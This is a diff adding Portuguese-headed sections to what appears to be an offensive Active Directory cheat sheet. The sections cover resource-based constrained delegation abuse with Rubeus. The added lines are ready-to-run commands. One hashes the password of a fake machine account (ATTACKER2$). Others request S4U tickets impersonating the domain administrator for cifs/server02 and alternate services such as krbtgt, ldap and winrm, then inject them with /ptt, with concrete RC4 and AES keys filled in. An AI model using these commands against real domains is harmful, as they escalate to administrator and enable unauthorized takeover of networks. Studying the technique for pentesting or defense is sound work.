@@ -1580,7 +1580,21 @@ OU POWERVIEW - VALORES ESTRANHOS
 ```
 Get-DomainComputer server02 -Properties 'msds-allowedtoactonbehalfofotheridentity'
 ```
+##### RESOURCE-BASED CONSTRAINED DELEGATION - NO RUBEUS, GERAR O HASH RC4 DA SENHA DO COMPUTADOR FALSO: ATTACKER2 : 32ED87BDB5FDC5E9CBA88547376818D4
+```
+.\Rubeus.exe hash /password:123456 /user:ATTACKER2$ /domain:tech.local
 
+```
+##### RESOURCE-BASED CONSTRAINED DELEGATION - NO RUBEUS, SOLICITAR TGS PARA A MAQUINA QUE TEMOS ACESSO PARA OS SERVICOS AUTORIZADOS NO AD: (cifs/TECH-DC01.TECH.LOCAL)
+```
+.\rubeus.exe s4u /user:ATTACKER2$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/server02 /domain:tech.local /ptt
+.\rubeus.exe s4u /user:ATTACKER2$ /aes256:E1B7610EFD532B94B231C753ADCD74C20B8812F27D8A65D913F4834FE1877E59 /aes128:D99EDC9BAFB9456F2DD3AF994CE99F25 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/server02 /domain:tech.local /ptt
+```
+SOLICITAR TICKET PARA OUTROS SERVIÇOS
+```
+.\rubeus.exe s4u /user:ATTACKER2$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/server02 /domain:tech.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
+.\rubeus.exe s4u /user:ATTACKER2$ /aes256:E1B7610EFD532B94B231C753ADCD74C20B8812F27D8A65D913F4834FE1877E59 /aes128:D99EDC9BAFB9456F2DD3AF994CE99F25 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/server02 /domain:tech.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
+```
 
 
 
